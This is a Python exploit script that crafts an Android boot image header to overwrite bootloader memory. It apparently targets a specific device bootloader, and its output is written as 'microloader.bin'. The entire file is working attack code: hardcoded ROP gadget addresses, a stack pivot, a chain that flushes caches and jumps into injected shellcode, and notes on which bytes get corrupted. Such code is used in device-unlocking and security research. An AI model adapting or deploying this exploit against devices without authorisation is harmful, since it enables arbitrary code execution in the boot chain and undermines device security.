#!/usr/bin/env python3
import sys
import struct

base = 0x41E00000

#   404c0:       bd8f            pop     {r0, r1, r2, r3, r7, pc}
pop_r0_r1_r2_r3_r7_pc = base + 0x404c0|1


#   266a0:       bd00            pop     {pc}
pop_pc = base + 0x30ddc|1

#   244b2:       4798            blx     r3; movs    r0, #0 ;pop     {r3, pc}
blx_r3_pop_r3 = base + 0x0171e|1

cache_func = base + 0x231E4

test = base + 0x177 # prints "Error, the pointer of pidme_data is NULL."

crafted_hdr_sz = 0x70
page_size = 4 # at least 4 for alignment
# NOTE: crafted_hdr_sz bytes before inject_addr become corrupt
# 2 * page_size bytes after inject_addr+inject_sz become corrupt
inject_addr = base + 0x30c
inject_sz = 0x200 - crafted_hdr_sz

#   1fdbc:       e893ad10        ldm     r3, {r4, r8, sl, fp, sp, pc}
pivot = base + 0x1FFDC


def main():

    input_file = None
    payload_file = "build/payload.bin"
    output_file = "../bin/microloader.bin"

    if len(sys.argv) == 2:
        output_file = sys.argv[1]
    elif len(sys.argv) == 3:
        payload_file = sys.argv[1]
        output_file = sys.argv[2]
    elif len(sys.argv) == 4:
        input_file = sys.argv[1]
        payload_file = sys.argv[2]
        output_file = sys.argv[3]

    orig = b""

    if input_file:
        with open(input_file, "rb") as fin:
            orig = fin.read(0x400)
            fin.seek(0x800)
            orig += fin.read()

    hdr = b"ANDROID!" # magic
    hdr += struct.pack("<II", inject_sz, inject_addr - crafted_hdr_sz + page_size) # kernel_size, kernel_addr
    hdr += struct.pack("<IIIIIIII", 0, 0, 0, 0, 0, page_size, 0, 0) # ramdisk_size, ramdisk_addr, second_size, second_addr, tags_addr, page_size, unused, os_version
    hdr += b"\x00" * 0x10 # name
    hdr += b"bootopt=64S3,32N2,32N2 buildvariant=user" # cmdline
    hdr += b"\x00" * (crafted_hdr_sz - len(hdr))

    assert len(hdr) == crafted_hdr_sz

    # the body gets injected at inject_addr
    # size of the body will be inject_sz
    shellcode_addr = inject_addr + 76 + 9 * 4
    print("shellcode base = 0x{:X}".format(shellcode_addr))
    # we start injection from get_var_wrapper
    body = bytes.fromhex("084B10B57B441C6844B1DFF81CC0FC44DCF80030A446BDE8104060476FF0010010BD00BF")
    body += struct.pack("<II", 36, 30)  # offset to func ptr, offset to arg - set up to point right below
    #body += struct.pack("<II", pivot, inject_addr + len(body) + 8)  # func ptr, func arg - right after this pack(), points at the end of ldm package
    body += struct.pack("<II", shellcode_addr, inject_addr + len(body) + 8)  # func ptr, func arg - right after this pack(), points at the end of ldm package
    # pivot args
    body += struct.pack("<IIIIII", 0, 0, 0, 0, inject_addr + len(body) + 4 * 6, pop_pc)  # r4, r8, sl, fp, sp, pc
    # rop chain
    # clean dcache, flush icache, then jump to payload
    chain = [
        pop_r0_r1_r2_r3_r7_pc,
        -1,             # r0
        0x1000,         # r1
        0xDEAD,         # r2
        cache_func,     # r3
        0xDEAD,         # r7
        blx_r3_pop_r3,
        0xDEAD,
        -1
    ]

    shellcode_addr = inject_addr + len(body) + len(chain) * 4
    print("shellcode base = 0x{:X}".format(shellcode_addr))
    chain[1] = chain[-1] = shellcode_addr
    chain_bin = b"".join([struct.pack("<I", word) for word in chain])
    body += chain_bin

    # shellcode binary
    with open(payload_file, "rb") as fin:
        shellcode = fin.read()
    print(len(shellcode))
    body += shellcode

    body += b"\x00" * (inject_sz - len(body))

    hdr += body

    hdr += b"\x00" * (0x400 - len(hdr))
    assert len(hdr) == 0x400
    hdr += orig

    with open(output_file, "wb") as fout:
        fout.write(hdr)


if __name__ == "__main__":
    main()
